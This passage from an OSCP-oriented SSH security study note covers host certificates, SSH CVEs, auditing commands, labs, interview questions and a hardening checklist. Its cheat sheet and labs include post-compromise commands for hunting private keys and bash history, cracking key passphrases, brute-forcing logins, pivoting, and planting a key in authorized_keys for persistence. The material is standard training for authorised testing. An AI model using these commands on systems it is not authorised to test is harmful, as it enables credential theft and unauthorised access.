# === CONFIGURE SERVER ===
# Add to /etc/ssh/sshd_config:
HostCertificate /etc/ssh/ssh_host_ed25519_key-cert.pub

# === CONFIGURE CLIENTS ===
# Add to ~/.ssh/known_hosts or /etc/ssh/ssh_known_hosts:
@cert-authority *.example.com ssh-ed25519 AAAAC3... (CA public key)

# Now clients trust any server with valid host certificate!
```

---

## Common SSH Vulnerabilities

### Known SSH Vulnerabilities

```
+-------------------------------------------------------------------+
|                 SSH VULNERABILITIES                                |
+-------------------------------------------------------------------+

DEBIAN WEAK KEY (CVE-2008-0166):
  Debian's OpenSSL had broken RNG (2006-2008)
  Only 32,767 possible keys!
  
  Check: debian-ssh-prefgen generates all weak keys
  Detect: Compare key fingerprint to weak key database
  
  Tools: debian-ssh-weak-keys, ssh-vulnkeys

HEARTBLEED IMPACT:
  If SSH server used OpenSSL 1.0.1-1.0.1f
  Private keys could be leaked via Heartbleed
  
TERRAPIN (CVE-2023-48795):
  Prefix truncation attack
  Affects ChaCha20-Poly1305 and CBC-ETM modes
  Can downgrade security features
  
  Mitigation: Update OpenSSH, disable affected ciphers

LIBSSH AUTH BYPASS (CVE-2018-10933):
  libssh (not OpenSSH) bug
  Send SSH2_MSG_USERAUTH_SUCCESS instead of request
  Server thinks client authenticated!

OPENSSH USER ENUMERATION (CVE-2016-6210):
  Timing difference reveals valid usernames
  Longer response for valid users

AGENT FORWARDING HIJACK:
  Root on intermediate host can use forwarded agent
  (See Agent Forwarding section)

+-------------------------------------------------------------------+
```

### Testing for SSH Vulnerabilities

```bash
# === SSH-AUDIT ===
# Comprehensive SSH configuration audit
pip install ssh-audit
ssh-audit target

# Sample output shows:
# - Supported algorithms
# - Vulnerabilities
# - Recommendations

# === NMAP SCRIPTS ===
# Enumerate algorithms
nmap --script ssh2-enum-algos -p 22 target

# Check authentication methods
nmap --script ssh-auth-methods --script-args="ssh.user=root" -p 22 target

# Brute force (careful!)
nmap --script ssh-brute -p 22 target

# === CHECK FOR WEAK KEYS ===
# Debian weak key check
wget https://github.com/g0tmi1k/debian-ssh/raw/master/common_keys/debian_ssh_rsa_2048_x86.tar.bz2
tar xjf debian_ssh_rsa_2048_x86.tar.bz2
# Compare target key fingerprint to these

# === TERRAPIN CHECK ===
# Check if vulnerable
nmap --script ssh2-enum-algos -p 22 target | grep -E "(chacha20|etm)"
```

---

## OSCP Relevance

### OSCP SSH Scenarios

```
+-------------------------------------------------------------------+
|                  OSCP SSH SCENARIOS                                |
+-------------------------------------------------------------------+

1. SSH KEY DISCOVERY
   - Find readable private keys
   - Check /home/*/.ssh/, /root/.ssh/
   - Look for keys in backups, web directories
   - Check bash history for SSH commands

2. SSH CREDENTIAL REUSE
   - Cracked password → try on SSH
   - Found key → try on multiple hosts
   - Same key often used across systems

3. SSH PIVOTING
   - Use compromised SSH access to reach internal networks
   - SOCKS proxy for internal scanning
   - Local forwards for specific services

4. SSH MISCONFIGURATIONS
   - Password auth enabled
   - Root login allowed
   - Agent forwarding enabled
   - Weak algorithms allowed

5. SSH BRUTE FORCE (CAREFUL)
   - Last resort
   - Use hydra, medusa, or nmap
   - Watch for lockouts

+-------------------------------------------------------------------+
```

### OSCP SSH Command Cheat Sheet

```bash
# === INITIAL ENUMERATION ===
nmap -sV -sC -p 22 target
nmap --script ssh2-enum-algos,ssh-auth-methods -p 22 target

# === FIND SSH KEYS ===
find / -name "id_rsa" 2>/dev/null
find / -name "id_ed25519" 2>/dev/null
find / -name "*.pem" 2>/dev/null
grep -r "BEGIN.*PRIVATE KEY" /home/ 2>/dev/null
grep -r "BEGIN OPENSSH PRIVATE KEY" /home/ 2>/dev/null

# === USE FOUND KEY ===
chmod 600 found_key
ssh -i found_key user@target

# === CRACK KEY PASSPHRASE ===
ssh2john id_rsa > hash.txt
john hash.txt --wordlist=rockyou.txt

# === SSH PIVOTING ===
# SOCKS proxy
ssh -D 1080 -N user@pivot
# Add to /etc/proxychains.conf: socks5 127.0.0.1 1080
proxychains nmap -sT -Pn internal_target

# Local forward
ssh -L 80:internal:80 user@pivot
curl http://localhost

# === VPN-LIKE ACCESS ===
sshuttle -r user@pivot 10.0.0.0/24

# === PERSISTENCE ===
# Add your key
echo "ssh-ed25519 AAAA..." >> ~/.ssh/authorized_keys
```

---

## Hands-On Labs

### Lab 1: SSH Key Generation and Authentication

```markdown
OBJECTIVE: Set up key-based authentication

TASKS:
1. Generate Ed25519 key pair
2. Copy public key to server
3. Configure SSH for key-only authentication
4. Test connection

STEPS:
# Generate key
ssh-keygen -t ed25519 -f ~/.ssh/lab_key -C "lab exercise"

# Copy to server
ssh-copy-id -i ~/.ssh/lab_key.pub user@server
# Or manually:
cat ~/.ssh/lab_key.pub | ssh user@server 'cat >> ~/.ssh/authorized_keys'

# Test
ssh -i ~/.ssh/lab_key user@server

# Verify key in authorized_keys
ssh user@server 'cat ~/.ssh/authorized_keys'
```

### Lab 2: SSH Tunneling Exercise

```markdown
OBJECTIVE: Access internal web server via SSH tunnel

SCENARIO:
- You have SSH access to jump.example.com
- Internal server web.internal:80 is only accessible from jump

TASKS:
1. Create local port forward
2. Access internal web server
3. Create SOCKS proxy
4. Browse entire internal network

STEPS:
# Local forward
ssh -L 8080:web.internal:80 user@jump.example.com

# Access in browser: http://localhost:8080

# SOCKS proxy
ssh -D 1080 user@jump.example.com

# Configure browser SOCKS proxy: 127.0.0.1:1080
# Now browse: http://web.internal
```

### Lab 3: SSH Key Hunting

```markdown
OBJECTIVE: Find and use SSH keys on compromised system

SCENARIO:
- You have shell on target system
- Find SSH keys and determine what they access

TASKS:
1. Search for private keys
2. Check key permissions/ownership
3. Determine where keys are accepted
4. Use key to pivot

COMMANDS:
# Find all SSH keys
find / -name "id_*" -type f 2>/dev/null
find / -name "*.pem" -type f 2>/dev/null

# Check for known_hosts (reveals targets)
cat /home/*/.ssh/known_hosts
cat /root/.ssh/known_hosts

# Check SSH config for hosts
cat /home/*/.ssh/config
cat /etc/ssh/ssh_config

# Check bash history
grep -h ssh /home/*/.bash_history 2>/dev/null

# Test found key
chmod 600 /tmp/found_key
ssh -i /tmp/found_key root@discovered_host
```

### Lab 4: Cracking SSH Key Passphrase

```markdown
OBJECTIVE: Crack passphrase on protected SSH key

SETUP:
1. Create key with weak passphrase:
   ssh-keygen -t rsa -b 2048 -f crackme -N "password123"

TASKS:
1. Extract hash from key
2. Crack with John or Hashcat
3. Use decrypted key

STEPS:
# Extract hash
ssh2john crackme > crackme_hash.txt

# Crack with John
john crackme_hash.txt --wordlist=rockyou.txt

# Show result
john --show crackme_hash.txt
# crackme:password123

# Use key
ssh -i crackme user@target
# Enter passphrase: password123
```

---

## Interview Questions

### Basic Level

1. **Q: What's the difference between SSH password and key authentication?**
   
   A: Password authentication sends the password over the encrypted channel (can still be weak, brute-forced). Key authentication uses public/private key pairs - the private key never leaves your machine. Keys are stronger, immune to brute force, and can have passphrases for two-factor effect.

2. **Q: What is the purpose of known_hosts?**
   
   A: known_hosts stores server public key fingerprints to prevent man-in-the-middle attacks. On first connection, you verify the fingerprint. Future connections check if the fingerprint matches, alerting you if the server key changed (potential MITM or server reinstall).

3. **Q: What's the difference between local and remote port forwarding?**
   
   A: Local forwarding (-L) makes a remote service accessible locally: traffic to local port goes through SSH to the remote destination. Remote forwarding (-R) makes a local service accessible remotely: the SSH server forwards connections to your local port.

### Intermediate Level

4. **Q: Explain SSH agent forwarding and its security implications.**
   
   A: Agent forwarding lets you use local SSH keys on remote servers for onward connections. The remote server gets a socket to communicate with your local agent. Security risk: root on the remote server can hijack this socket to impersonate you. Better alternative: ProxyJump, which doesn't expose agent.

5. **Q: How would you set up SSH for maximum security?**
   
   A: Key-only authentication (disable password), Ed25519 keys, disable root login, use AllowUsers/AllowGroups, modern ciphers only (ChaCha20-Poly1305, AES-GCM), disable agent/X11 forwarding unless needed, use fail2ban for brute-force protection, consider SSH certificates for enterprise, enable logging.

6. **Q: What is the purpose of SSH certificates vs regular keys?**
   
   A: Regular keys require managing authorized_keys on every server. SSH certificates use a Certificate Authority - servers trust the CA, users get signed certificates. Benefits: centralized management, automatic expiry, role-based access via principals, better auditing. Scale better for large organizations.

### Advanced Level

7. **Q: Describe how you would pivot through multiple SSH hops.**
   
   A: Several methods: 1) ProxyJump: `ssh -J hop1,hop2 target` - creates chained tunnels. 2) SOCKS proxy: `ssh -D 1080 hop1`, then use proxychains for tools. 3) sshuttle for VPN-like access. 4) Nested port forwards. 5) Chisel for HTTP tunneling if SSH is blocked. Each has tradeoffs in convenience, stealth, and capability.

8. **Q: How would you detect and defend against SSH key theft?**
   
   A: Detection: Monitor authorized_keys changes, log SSH connections, use certificates with short validity, check for unexpected keys. Defense: Key passphrases, proper file permissions (600), HSMs for critical keys, certificate-based auth with short expiry, privileged access management solutions, agent confirmation prompts.

9. **Q: Explain the Debian weak key vulnerability and its implications.**
   
   A: From 2006-2008, Debian's OpenSSL had a bug where the random number generator only used process ID for entropy. This reduced all possible keys to ~32,767 variants. All keys generated on affected systems are predictable. Attackers can pre-generate all weak keys and check if a target uses one. Still relevant for old, unpatched systems.

---

## Quick Reference

### SSH Command Cheat Sheet

```bash
# === CONNECTION ===
ssh user@host                     # Basic connection
ssh -p 2222 user@host            # Different port
ssh -i key user@host              # Specific key
ssh -v user@host                  # Verbose
ssh -vvv user@host                # Very verbose

# === KEY MANAGEMENT ===
ssh-keygen -t ed25519             # Generate key
ssh-keygen -l -f key.pub          # Show fingerprint
ssh-keygen -y -f key              # Extract public from private
ssh-copy-id user@host             # Copy key to server

# === AGENT ===
eval $(ssh-agent)                 # Start agent
ssh-add                           # Add default key
ssh-add -l                        # List keys
ssh-add -D                        # Remove all

# === TUNNELING ===
ssh -L 8080:dest:80 user@host     # Local forward
ssh -R 8080:dest:80 user@host     # Remote forward
ssh -D 1080 user@host             # SOCKS proxy
ssh -N user@host                  # No shell
ssh -f user@host                  # Background

# === PROXY/JUMP ===
ssh -J jump user@internal         # ProxyJump
ssh -o ProxyCommand="ssh -W %h:%p jump" user@internal

# === FILE TRANSFER ===
scp file user@host:/path/         # Copy to remote
scp user@host:/path/file ./       # Copy from remote
sftp user@host                    # Interactive SFTP

# === PIVOTING ===
sshuttle -r user@pivot 10.0.0.0/24
# Route subnet through SSH
```

### Important File Locations

```
+-------------------------------------------------------------------+
|                SSH FILE LOCATIONS                                  |
+-------------------------------------------------------------------+

CLIENT (~/.ssh/):
  id_ed25519         Private key (Ed25519)
  id_ed25519.pub     Public key
  id_rsa             Private key (RSA)
  id_rsa.pub         Public key
  known_hosts        Server fingerprints
  config             Client configuration
  authorized_keys    Accepted public keys (on server)

SERVER (/etc/ssh/):
  sshd_config        Server configuration
  ssh_config         System-wide client config
  ssh_host_*_key     Host private keys
  ssh_host_*_key.pub Host public keys
  
LOGS:
  /var/log/auth.log  (Debian/Ubuntu)
  /var/log/secure    (RHEL/CentOS)

+-------------------------------------------------------------------+
```

### SSH Hardening Checklist

```
+-------------------------------------------------------------------+
|               SSH HARDENING CHECKLIST                              |
+-------------------------------------------------------------------+

[ ] Disable password authentication
    PasswordAuthentication no
    
[ ] Disable root login
    PermitRootLogin no
    
[ ] Use key authentication only
    PubkeyAuthentication yes
    
[ ] Limit users/groups
    AllowUsers admin deploy
    AllowGroups sshusers
    
[ ] Use strong algorithms
    KexAlgorithms curve25519-sha256
    Ciphers chacha20-poly1305@openssh.com,aes256-gcm
    MACs hmac-sha2-512-etm@openssh.com
    
[ ] Disable unnecessary features
    X11Forwarding no
    AllowTcpForwarding no
    AllowAgentForwarding no
    
[ ] Set idle timeout
    ClientAliveInterval 300
    ClientAliveCountMax 2
    
[ ] Limit authentication attempts
    MaxAuthTries 3
    
[ ] Use fail2ban or similar
    
[ ] Regular key rotation
    
[ ] Audit authorized_keys regularly
    
[ ] Consider SSH certificates for enterprise

+-------------------------------------------------------------------+
```

---

## Related Files

- [[05_Asymmetric_Encryption]] - Public key cryptography concepts
- [[06_PKI_TLS_and_Certificates]] - Certificate concepts (SSH certs similar)
- [[07_Password_Cracking]] - SSH key passphrase cracking
- [[09_Encryption_at_Rest]] - Key storage security

---

## Resources

### Official Documentation
- [OpenSSH Manual Pages](https://www.openssh.com/manual.html)
- [SSH.COM Protocol Documentation](https://www.ssh.com/ssh/protocol/)

### Security Tools
- [ssh-audit](https://github.com/jtesta/ssh-audit) - SSH configuration auditing
- [SSHScan](https://github.com/mozilla/ssh_scan) - Mozilla SSH scanner
- [Paramiko](https://www.paramiko.org/) - Python SSH library

### Learning Resources
- [SSH Mastery (Book)](https://www.tiltedwindmillpress.com/product/ssh-mastery-2nd-edition/)
- [Awesome SSH](https://github.com/moul/awesome-ssh) - Curated SSH resources

---

*Last updated: 2025-02-07*
